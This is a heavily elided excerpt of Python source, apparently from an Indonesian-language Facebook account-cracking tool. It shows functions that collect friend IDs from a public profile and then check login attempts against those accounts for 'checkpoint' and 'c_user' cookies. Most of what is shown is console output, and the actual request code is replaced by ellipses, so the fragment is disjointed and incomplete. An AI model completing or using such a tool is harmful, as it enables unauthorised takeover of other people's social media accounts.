...
def publik():
    ...
    try:
        ...
        for i in z['friends']['data']:
            ...
            print('%s║'%(B))
            print('%s║'%(B))
            print(f"{K}╠══[•] {U}Maaf User ID Tidak Bersifat Publik");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Total id : {B}{len(id)}")
        fii_xd()
    else:print(f"{K}╠══[•] {P}Total id : {B}{len(id)}")
...
def log_hasil(user,pasw):
	...
	if "checkpoint" in ses.cookies:
		...
		if "0" in str(len(ngew)):
			jalan(f"\r{P}[•]{I} akun tap yess, silahkan login di fb lite")
...
def cek_log(uid, pw, ua):
    ...
    try:
        ...
        print('%s║'%(B))
        print('%s║'%(B))
        jalan(f"\r{M}[!] Akun Anda terkena spam")
    if "c_user" in ses.cookies:
      jalan(f"\r{P}[•]{I} Akun anda berhasil di login")
